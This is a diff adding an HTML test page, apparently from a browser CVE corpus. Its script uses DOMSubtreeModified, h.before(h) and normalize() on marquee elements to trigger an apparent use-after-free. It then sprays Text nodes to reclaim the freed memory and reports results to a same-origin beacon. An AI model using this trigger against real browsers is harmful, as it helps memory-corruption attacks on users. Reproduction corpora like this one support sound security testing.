@@ -1,0 +1,60 @@
+<!doctype html>
+<meta charset="utf-8">
+<title>cve2</title>
+<script>
+function b(tag){
+  var u = location.origin + '/beacon/CVE2-' + tag + '?t=' + Date.now();
+  try { var x=new XMLHttpRequest(); x.open('GET',u,false); x.send(); return; } catch(e){}
+  try { navigator.sendBeacon(u); } catch(e){}
+}
+b('S');
+var ITER = 300;
+var crashes = 0, odd = 0, iters = 0;
+
+function one(i){
+  var m = document.createElement('marquee');
+  var h = document.createElement('hr');
+  m.appendChild(document.createTextNode('t' + i));
+  m.appendChild(h);
+  m.appendChild(document.createTextNode('u' + i));
+  document.documentElement.appendChild(m);
+  var armed = true;
+  m.addEventListener('DOMSubtreeModified', function(){
+    if (!armed) return;
+    armed = false;
+    try { h.before(h); } catch(e) { }
+    try { m.normalize(); } catch(e) { }
+    if (i === 0) {
+      var desc = [];
+      for (var q=0;q<m.childNodes.length;q++){
+        var n=m.childNodes[q];
+        desc.push((n.nodeType===3 ? 'T:'+JSON.stringify(n.data) : n.nodeName) + '/p' + (n.parentNode===m?1:0));
+      }
+      b('EV0:' + m.childNodes.length + ':' + desc.join('|'));
+    }
+    // reclaim any freed Text node with fresh Text nodes of the same class
+    var keep = [];
+    for (var k=0;k<64;k++) keep.push(document.createTextNode('z' + k));
+    window.__keep = (window.__keep || []).concat(keep);
+    try { for (var k=0;k<16;k++) keep[k].remove(); } catch(e) {}
+  });
+  try { m.setAttribute('a',''); } catch(e) { }
+  // structural check: the marquee must still contain h and its text nodes
+  var kids = m.childNodes;
+  var hasHr = false;
+  for (var j=0;j<kids.length;j++) if (kids[j] === h) hasHr = true;
+  if (!hasHr) odd++;
+  try { m.remove(); } catch(e) {}
+  iters++;
+}
+
+function loop(){
+  for (var i=0;i<ITER;i++){
+    try { one(i); } catch(e) { b('X:' + (e && e.name) + ':' + i); break; }
+  }
+  b('DONE:iters=' + iters + ',odd=' + odd + ',kids=' + document.documentElement.childNodes.length);
+  setTimeout(function(){ location.replace('/corpus/cve3.html?t=black&r=' + Date.now()); }, 300);
+}
+setTimeout(loop, 0);
+</script>
+<p>cve2</p>
